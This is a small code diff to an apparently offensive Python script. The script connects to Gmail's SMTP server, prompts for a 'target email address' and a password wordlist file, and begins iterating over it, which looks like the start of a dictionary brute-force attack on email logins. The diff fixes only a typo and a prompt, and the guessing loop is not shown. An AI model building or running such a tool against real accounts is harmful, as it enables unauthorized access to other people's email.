@@ -1,6 +1,6 @@
 import smtplib
 
-smtpserver = smtplb.SMTP("smtp.gmail.com", 587)
+smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
 
 #connects to server
 smtpserver.ehlo()
@@ -8,7 +8,7 @@ smtpserver.ehlo()
 smtpserver.starttls()
 
 user = raw_input("Enter target email address: ")
-passwordfile = raw_input("Enter the password file")
+passwordfile = raw_input("Enter the password file: ")
 
 passwordfile = open(passwordfile, "r")
 count = 0
